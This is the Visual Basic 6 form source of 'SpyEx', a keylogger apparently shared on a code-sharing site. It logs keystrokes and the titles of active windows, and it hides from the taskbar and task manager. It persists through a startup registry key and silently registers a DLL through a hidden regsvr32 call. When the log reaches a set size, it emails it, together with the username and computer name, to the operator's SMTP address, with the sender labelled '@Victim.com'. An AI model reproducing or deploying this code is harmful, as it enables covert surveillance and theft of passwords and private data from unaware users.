VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H80000007&
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "SpyEx"
   ClientHeight    =   3630
   ClientLeft      =   150
   ClientTop       =   840
   ClientWidth     =   4965
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   LockControls    =   -1  'True
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3630
   ScaleWidth      =   4965
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text3 
      BackColor       =   &H80000006&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000005&
      Height          =   435
      Left            =   1080
      TabIndex        =   2
      Text            =   "100"
      Top             =   3120
      Width           =   615
   End
   Begin VB.CheckBox Check1 
      BackColor       =   &H80000007&
      Caption         =   "Start with Windows"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   2040
      TabIndex        =   4
      ToolTipText     =   "A key will be created in the Registry"
      Top             =   2040
      Width           =   2415
   End
   Begin VB.TextBox Text2 
      BackColor       =   &H80000006&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000005&
      Height          =   495
      Left            =   2040
      TabIndex        =   1
      Text            =   "smtp.MyDomain.com"
      ToolTipText     =   "Contact your ISP if you don't know your smtp server name"
      Top             =   1440
      Width           =   2775
   End
   Begin VB.CommandButton Command1 
      BackColor       =   &H80000010&
      Caption         =   "Start SpyEx"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      Height          =   855
      Left            =   3240
      MaskColor       =   &H000000FF&
      Picture         =   "Form1.frx":0442
      Style           =   1  'Graphical
      TabIndex        =   3
      Top             =   2640
      Width           =   1575
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H80000006&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000005&
      Height          =   495
      Left            =   2040
      TabIndex        =   0
      Text            =   "Me@MyDomain.com"
      ToolTipText     =   "Your E-Mail Address"
      Top             =   840
      Width           =   2775
   End
   Begin VB.Timer Timer1 
      Left            =   1440
      Top             =   2040
   End
   Begin VB.Label Label6 
      BackStyle       =   0  'Transparent
      Caption         =   "M"
      BeginProperty Font 
         Name            =   "Wingdings"
         Size            =   48
         Charset         =   2
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   975
      Left            =   2040
      TabIndex        =   10
      Top             =   2520
      Width           =   975
   End
   Begin VB.Image Image2 
      Height          =   480
      Left            =   120
      Picture         =   "Form1.frx":0884
      Top             =   840
      Width           =   480
   End
   Begin VB.Image Image1 
      Height          =   480
      Left            =   120
      Picture         =   "Form1.frx":0CC6
      Top             =   1440
      Width           =   480
   End
   Begin VB.Label Label5 
      BackStyle       =   0  'Transparent
      Caption         =   "Size in KB"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   120
      TabIndex        =   9
      Top             =   3240
      Width           =   735
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "Created by Chris Richmond"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   18
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   495
      Left            =   0
      TabIndex        =   8
      Top             =   120
      Width           =   5295
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "E-Mail file when it reaches what size?"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   495
      Left            =   120
      TabIndex        =   7
      Top             =   2520
      Width           =   1695
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Server:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   495
      Left            =   840
      TabIndex        =   6
      Top             =   1440
      Width           =   1455
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "E-Mail:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   840
      TabIndex        =   5
      Top             =   840
      Width           =   1455
   End
   Begin VB.Menu op 
      Caption         =   "Options"
      Begin VB.Menu email 
         Caption         =   "Send Test E-Mail"
      End
      Begin VB.Menu install 
         Caption         =   "Install SpyEx"
      End
      Begin VB.Menu reg 
         Caption         =   "Delete Registry Settings"
      End
   End
   Begin VB.Menu helpMenu 
      Caption         =   "Help"
      Begin VB.Menu features 
         Caption         =   "Features"
      End
      Begin VB.Menu cmd 
         Caption         =   "Command-Line"
      End
      Begin VB.Menu abount 
         Caption         =   "About"
      End
      Begin VB.Menu help 
         Caption         =   "SMTP Help"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Any questions or comments, contact me at itcdr@yahoo.com
'Please vote for me at www.planetsourcecode.com

'API Functions
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

'Variable Declarations
Dim title As String, last As String, strInfo As String, arg() As String, fileName As String
Dim handle As Long, length As Long, size, fileSize, winDir As String, winDirLen As String, installed As Boolean
Dim fso As New FileSystemObject, txt As TextStream

Function createReport()
  'Set Text File path to current path of application
  fileName = App.Path & "\SpyEx.txt"
  
  'Create text file
  Set txt = fso.OpenTextFile(fileName, ForAppending, True)
  
  'Write Started time and date to file
  txt.WriteLine ("Started: " & Now)
  
  'Get computer name and current user name and write to file
  Set objnet = CreateObject("WScript.NetWork")
  strInfo = "User Name: " & objnet.Username & vbCrLf & _
            "Computer Name: " & objnet.ComputerName & vbCrLf
  txt.WriteLine (vbNewLine & strInfo)
End Function

Function emailReport(Optional test As Boolean)
    
    On Error Resume Next
    
    Set objnet = CreateObject("WScript.NetWork")
    
    Set oSMTPSession = CreateObject("OSSMTP.SMTPSession")

    With oSMTPSession
     .MailFrom = objnet.ComputerName & "@Victim.com"
     .SendTo = Text1.Text
     .Server = Text2.Text
     .Port = 25
     .MessageSubject = "SpyEx Report!!!" & vbTab & Now
     .MessageText = "The SpyEx Report is attached."
     
     If test = True Then
        MsgBox "E-Mail Sent." & vbNewLine & "If you do not recieve an e-mail within the next couple of minutes, " & _
        vbNewLine & "then you either misspelled something or you are trying the wrong server." & _
        vbNewLine & "To get your server name, contact your ISP. For more info. see smtp help in the help menu", , "E-Mail Test"
        GoTo send
     End If
     
     'adding attachment
     Set oAttachment = CreateObject("OSSMTP.Attachment")
     oAttachment.FilePath = fileName
     oAttachment.AttachmentName = "SpyEx Report"
     oAttachment.ContentType = "application/xml"
     oAttachment.ContentTransferEncoding = 1
     .Attachments.Add oAttachment
send:
     .SendEmail
    End With
    Set oSMTPSession = Nothing
End Function

Private Sub abount_Click()
  MsgBox "I am a computer engineering student at UNLV." & _
         vbNewLine & "My e-mail address is itcdr@yahoo.com", , "About Chris Richmond"
End Sub

Private Sub cmd_Click()
    MsgBox "Syntax: SpyEx [-s] [-i] [-u]" & vbNewLine & _
           "-s" & vbTab & "Shows option's window" & vbNewLine & _
           "-i" & vbTab & "Install SpyEx" & vbNewLine & _
           "-u" & vbTab & "Uninstall SpyEx" & vbNewLine & _
           "ie: SpyEx -s", , "Command-line Syntax"
End Sub

Private Sub Command1_Click()
  'Start with windows
  If Check1.Value = 1 Then startup
  'Create text file
  createReport
  
  'Hide
  App.TaskVisible = False
  Me.Hide
    
  'Set Timer to one mili-second
  Timer1.Interval = 1
    
  'Start keyboard hook
  KeyboardHook
  
  'Save settings to registry
  SaveSetting "SpyEx", "Registered", "startup", Check1.Value
  SaveSetting "SpyEx", "Registered", "email", Text1.Text
  SaveSetting "SpyEx", "Registered", "server", Text2.Text
  SaveSetting "SpyEx", "Registered", "file", Text3.Text
  SaveSetting "SpyEx", "Registered", "started", True
  
End Sub

Private Sub email_Click()
  emailReport True
End Sub

Private Sub features_Click()
MsgBox "SpyEx is a keylogger that runs in the background and monitors the selected window and the keyboard input." _
  & vbNewLine & vbNewLine & "- To close SpyEx and show the output file location, Press F12" _
  & vbNewLine & vbNewLine & "- The SpyEx output file is located in the same folder as the program itself" _
  & vbNewLine & vbNewLine & "- SpyEx is hidden from the taskbar and task manager" _
  & vbNewLine & vbNewLine & "- SpyEx now has a command-line interface arguments:" _
  & vbNewLine & vbTab & "Syntax: SpyEx [-s] [-i] [-u]" _
  & vbNewLine & vbTab & vbTab & "-s" & vbTab & "Shows option's window" _
  & vbNewLine & vbTab & vbTab & "-i" & vbTab & "Install SpyEx" _
  & vbNewLine & vbTab & vbTab & "-u" & vbTab & "Uninstall SpyEx" _
  & vbNewLine & vbTab & vbTab & "ie: C:\path\SpyEx -s (HINT: if SpyEx is installed you do not need to put the path before SpyEx. spyex -s can be used in either run or the command prompt.)" _
  & vbNewLine & vbNewLine & _
"- SpyEx now includes the option to e-mail yourself the output file everytime the file reaches a specified size", , "SpyEx"
End Sub

Private Sub Form_Load()
  
  'Don't stop for any errors
  On Error Resume Next
  
  'Get windows directory
  winDir = Space(255)
  winDirLen = GetWindowsDirectory(winDir, 255)
  winDir = Left$(winDir, winDirLen) & "\system32\"
  
  'Copy dll to system folder and register it
  fso.CopyFile App.Path & "\OSSMTP.dll", winDir & "OSSMTP.dll", True
  Shell "cmd /c regsvr32/s ossmtp.dll", vbHide
    
  'Check for previous instance
  If App.PrevInstance Then
    MsgBox "SpyEx is already opened."
    End
  End If
  
  'Set keycodes
  keyChar = Array(8, 9, 160, 17, 18, 35, 36, 46, 91, 92, _
                  112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, _
                  32, 106, 107, 109, 110, 111, 186, 187, 188, 189, 190, 191, 192, 219, 220, 221, 222, _
                  96, 97, 98, 99, 100, 101, 102, 103, 104, 105)
  
  keyList = Array("BACK", "TAB", "SHIFT", "CTRL", "ALT", "END", "HOME", "DEL", "LWIN", "RWIN", _
                  "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12", _
                  " ", "*", "+", "-", ".", "/", ";", "=", ",", "-", ".", "/", "`", "[", "\", "[", "'", _
                  "0", "1", "2", "3", "4", "5", "6", "7", "8", "9")
  
  'Help
  If Command = "/?" Then
    MsgBox "Syntax: SpyEx [-s] [-i] [-u]" & vbNewLine & _
           "-s" & vbTab & "Show option's menu" & vbNewLine & _
           "-i" & vbTab & "Install SpyEx" & vbNewLine & _
           "-u" & vbTab & "Uninstall SpyEx" & vbNewLine & _
           "ie: SpyEx -s", , "Command-line Syntax"
    End
  
  'Uninstall
  ElseIf Command = "-u" Then
   'Delete Registry keys
   DeleteSetting ("SpyEx")
   startup True
   'Delete installed files
   fso.DeleteFile winDir & "SpyEx.exe"
   'Output
   MsgBox "SpyEx Successfully Uninstalled."
   End
  
  'Show options
  ElseIf Command = "-s" Then
    Me.Show
  
  'Install
  ElseIf Command = "-i" Then
    'Copy app and dll to system32 file
    fso.CopyFile App.Path & "\OSSMTP.dll", winDir & "OSSMTP.dll", True
    fso.CopyFile App.Path & "\" & App.EXEName & ".exe", winDir & "SpyEx.exe", True
    'Output
    MsgBox "SpyEx installed in " & winDir & vbNewLine & _
           "You can now use command-line arguments from run or the command prompt without the path first."
    End
  
  'If no command then get settings
  Else
    Dim cont As Boolean
    
    'If there are no saved settings then skip
    On Error GoTo skip
    Check1.Value = GetSetting("SpyEx", "Registered", "startup")
    Text1.Text = GetSetting("SpyEx", "Registered", "email")
    Text2.Text = GetSetting("SpyEx", "Registered", "server")
    Text3.Text = GetSetting("SpyEx", "Registered", "file")
    cont = GetSetting("SpyEx", "Registered", "started")
    If cont = True Then Command1_Click
  End If
skip:
End Sub

Private Sub Form_Terminate()
  'Unhook keyboard
  Unhook
End Sub

Private Sub Form_Unload(Cancel As Integer)
  On Error Resume Next
  
  'Write Ending time and date to file
  txt.Write (vbNewLine & "Ended: " & Now & vbNewLine & vbNewLine)
  
  'Close File
  txt.Close
  
  'Unhook keyboard
  Unhook
End Sub

Private Sub help_Click()
  MsgBox "To find your smtp server name:" & vbNewLine & _
          "-Contact your ISP. Usually you can find it at their website." & vbNewLine & _
          "-Use nslookup:" & vbNewLine & vbTab & _
          "1. Go to run." & vbNewLine & vbTab & _
          "2. Type 'nslookup' and hit enter." & vbNewLine & vbTab & _
          "3. Type 'set type=mx' and hit enter." & vbNewLine & vbTab & _
          "4. Type 'yourDomain.com' (ie: yahoo.com or hotmail.com) and hit enter." & vbNewLine & vbTab & _
          "5. Look for mail exchanger", , "Help"
End Sub

Private Sub install_Click()
  'Copy app and dll to system32 folder
  fso.CopyFile App.Path & "\OSSMTP.dll", winDir & "OSSMTP.dll", True
  fso.CopyFile App.Path & "\" & App.EXEName & ".exe", winDir & "SpyEx.exe", True
  MsgBox "SpyEx installed in " & winDir & vbNewLine & _
         "You can now use command-line arguments from run or the command prompt without the path first."
  End
End Sub

Private Sub reg_Click()
   On Error Resume Next
   
   'Delete registry keys
   DeleteSetting ("SpyEx")
   startup True
   'Output
   MsgBox "Registry settings deleted."
End Sub

Private Sub Timer1_Timer()
  On Error Resume Next
  
  'Set last = current title
  last = title
  
  'Get Active Window handle
  handle = GetForegroundWindow
  
  'Get Active Window Text Length
  length = GetWindowTextLength(handle)
  
  'Create String Buffer
  title = String(length, Chr$(0))
  
  'Get Title of Active Window
  GetWindowText handle, title, length + 1
  
  'Record data from last window when new window is active
  If title <> last And last <> "" Then
    txt.WriteLine ("[" & Time & "]" & "<<" & last & ">>" & vbTab & keys)
    keys = ""
  End If
  
  'Get size of text file in kilo-bytes
  fileSize = FileLen(fileName) / 1000
  
  If fileSize >= Text3.Text Then
    'Write Ending time and date to file
    txt.Write (vbNewLine & "Ended: " & Now & vbNewLine & vbNewLine)
  
    'Close File
    txt.Close
    
    'Email file
    emailReport
    
    'Delete report and create a new one
    Kill (fileName)
    createReport
  End If
End Sub
